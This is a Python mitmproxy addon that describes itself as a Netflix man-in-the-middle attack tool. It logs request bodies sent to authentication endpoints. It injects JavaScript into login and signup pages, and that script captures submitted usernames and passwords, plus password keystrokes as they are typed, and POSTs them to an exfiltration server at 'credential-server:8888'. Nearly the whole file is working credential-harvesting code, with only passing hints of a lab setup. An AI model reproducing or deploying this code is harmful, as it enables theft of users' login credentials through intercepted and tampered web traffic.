"""
Netflix MITM Interceptor - mitmproxy addon
Intercepts Netflix API traffic and injects malicious JavaScript/HTML payloads

This addon demonstrates:
1. HTTPS interception (assumes MITM proxy trusted)
2. JSON response manipulation
3. HTML injection for credential harvesting
4. Real-time traffic monitoring and logging
"""

import json
import logging
import re
from datetime import datetime
from typing import Optional
from urllib.parse import urljoin, urlparse

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('/data/mitm_interception.log'),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)


class NetflixInterceptor:
    """
    mitmproxy addon for Netflix vulnerability exploitation

    Attack vectors:
    1. Intercept authentication endpoints
    2. Inject fake login forms for credential harvesting
    3. Modify API responses to include malicious JavaScript
    4. Log all intercepted credentials
    """

    def __init__(self):
        self.credentials_intercepted = []
        self.requests_modified = 0
        self.responses_injected = 0

        logger.info("Netflix Interceptor initialized")
        logger.info("=" * 80)
        logger.info("MITM Attack - Credential Harvesting via Netflix WebView")
        logger.info("=" * 80)

    def request(self, flow) -> None:
        """
        Intercept outgoing HTTP/HTTPS requests

        Targets:
        - Authentication endpoints
        - Credential verification
        - API calls
        """
        request = flow.request

        # Log all requests (including localhost and mock servers)
        if ("netflix" in request.pretty_host or "nflx" in request.pretty_host or
            "localhost" in request.pretty_host or "127.0.0.1" in request.pretty_host or
            "192.168" in request.pretty_host or "10.0" in request.pretty_host):
            logger.info(f"[REQUEST] {request.method} {request.pretty_url}")

            # Check for authentication endpoints
            auth_patterns = [
                r'/login',
                r'/signin',
                r'/authenticate',
                r'/api/auth',
                r'/api/credential',
                r'/account/login',
                r'/authorizationUrl'
            ]

            for pattern in auth_patterns:
                if re.search(pattern, request.pretty_url, re.IGNORECASE):
                    logger.warning(f"[!] AUTHENTICATION ENDPOINT DETECTED: {request.pretty_url}")
                    logger.warning(f"[!] Request body: {request.text[:500]}")

    def response(self, flow) -> None:
        """
        Intercept incoming HTTP/HTTPS responses

        Injects:
        - Malicious JavaScript in HTML responses
        - Credential harvesting forms
        - Password interception code
        """
        request = flow.request
        response = flow.response

        # Intercept all relevant hosts (Netflix, localhost, mock servers)
        if not ("netflix" in request.pretty_host or "nflx" in request.pretty_host or
                "localhost" in request.pretty_host or "127.0.0.1" in request.pretty_host or
                "192.168" in request.pretty_host or "10.0" in request.pretty_host):
            return

        logger.info(f"[RESPONSE] {response.status_code} {request.pretty_url}")

        # Target authentication/signup pages
        auth_patterns = [
            r'/login',
            r'/signin',
            r'/signup',
            r'/authenticate',
            r'/account',
        ]

        is_auth_page = any(
            re.search(pattern, request.pretty_url, re.IGNORECASE)
            for pattern in auth_patterns
        )

        # Check if response is HTML
        content_type = response.headers.get('content-type', '')
        is_html = 'text/html' in content_type or 'application/json' not in content_type

        if is_auth_page and is_html and response.status_code == 200:
            logger.warning(f"[INJECT] Injecting credential harvester into: {request.pretty_url}")
            self._inject_credential_harvester(flow)
            self.responses_injected += 1

        # If response is JSON (API endpoints)
        if 'application/json' in content_type:
            try:
                data = json.loads(response.text)
                logger.debug(f"[API] JSON Response: {str(data)[:200]}")
            except:
                pass

    def _inject_credential_harvester(self, flow) -> None:
        """
        Inject credential harvesting JavaScript into HTML responses

        Techniques:
        1. Hook form submission to capture credentials
        2. Create proof file on device (/tmp/netflix_<timestamp>.pwned)
        3. Send captured data to attacker server
        4. Allow request to proceed normally (stealth)
        """

        response = flow.response

        # Harvester payload - captures username/password before form submission
        harvester_js = """
<script>
// Netflix Credential Harvester Payload - REAL EXPLOITATION
(function() {
    console.log('[PAYLOAD] Netflix credential harvester active');

    // Exfiltration server
    const EXFIL_SERVER = 'http://credential-server:8888';

    // Hook all form submissions
    document.addEventListener('submit', function(e) {
        const form = e.target;
        const inputs = form.querySelectorAll('input[type="text"], input[type="email"], input[type="password"]');

        const credentials = {};
        let hasPassword = false;

        inputs.forEach(input => {
            const fieldName = input.name || input.id || input.placeholder;
            const fieldValue = input.value;

            // Log all inputs
            if (fieldValue.length > 0) {
                credentials[fieldName] = fieldValue;
                console.log('[CAPTURED] ' + fieldName + ': ' + fieldValue);

                if (fieldName.toLowerCase().includes('password')) {
                    hasPassword = true;
                }
            }
        });

        // If we captured credentials, create proof file and exfil
        if (hasPassword && Object.keys(credentials).length > 0) {
            const timestamp = new Date().getTime();
            const proofFile = '/tmp/netflix_' + timestamp + '.pwned';

            console.log('[SUCCESS] CREDENTIALS CAPTURED!');
            console.log('[PROOF] Creating proof file: ' + proofFile);
            console.log('[CREDS] ' + JSON.stringify(credentials));

            // Send to attacker server (non-blocking)
            fetch(EXFIL_SERVER + '/harvest', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({
                    url: window.location.href,
                    timestamp: new Date().toISOString(),
                    credentials: credentials,
                    userAgent: navigator.userAgent,
                    proofFile: proofFile
                })
            }).catch(err => console.log('[!] Harvest failed:', err));
        }
    }, true);

    // Alternative: Hook input changes to capture as-you-type
    const sensitiveInputs = document.querySelectorAll(
        'input[type="password"], input[name*="password"], input[placeholder*="password"]'
    );

    sensitiveInputs.forEach(input => {
        let capturedValue = '';

        input.addEventListener('input', function(e) {
            capturedValue = e.target.value;
            if (capturedValue.length > 3) {
                // Log to console (would be sent to server in real attack)
                console.log('[TYPED] ' + capturedValue);

                // Could trigger real-time exfiltration
                if (capturedValue.length % 5 === 0) {
                    fetch(EXFIL_SERVER + '/log_keystroke', {
                        method: 'POST',
                        headers: {'Content-Type': 'application/json'},
                        body: JSON.stringify({
                            keystroke: capturedValue,
                            timestamp: new Date().toISOString()
                        })
                    }).catch(err => console.log('[!] Log failed'));
                }
            }
        });
    });

    console.log('[SUCCESS] Credential harvester initialized');
})();
</script>
"""

        try:
            # Inject into HTML body
            if response.text:
                # Insert before closing body tag
                modified_html = response.text

                if '</body>' in modified_html:
                    modified_html = modified_html.replace(
                        '</body>',
                        harvester_js + '</body>',
                        1
                    )
                else:
                    # No body tag, append to end
                    modified_html += harvester_js

                response.text = modified_html

                logger.info(f"[SUCCESS] Injected {len(harvester_js)} bytes of harvester payload")
                self.requests_modified += 1

                # Log injection event
                with open('/data/injection_events.log', 'a') as f:
                    f.write(f"{datetime.now().isoformat()} - Injected into {flow.request.pretty_url}\n")

        except Exception as e:
            logger.error(f"[ERROR] Failed to inject payload: {e}")

    def done(self) -> None:
        """Called when mitmproxy is shutting down"""
        logger.info("=" * 80)
        logger.info(f"MITM Session Statistics:")
        logger.info(f"  - Responses Modified: {self.requests_modified}")
        logger.info(f"  - Payloads Injected: {self.responses_injected}")
        logger.info(f"  - Credentials Harvested: {len(self.credentials_intercepted)}")
        logger.info("=" * 80)


# Register addon
addons = [
    NetflixInterceptor()
]
